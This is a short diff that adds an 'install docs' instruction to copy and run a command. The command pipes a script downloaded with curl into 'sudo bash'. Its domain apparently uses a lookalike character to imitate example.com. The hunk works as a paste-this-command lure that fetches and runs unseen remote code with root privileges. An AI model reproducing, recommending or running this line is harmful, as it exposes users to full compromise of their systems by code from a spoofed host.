@@ -1,0 +1,2 @@
+# From the install docs - copy this and run it:
+curl -fsSL https://exаmple.com/get.sh | sudo bash
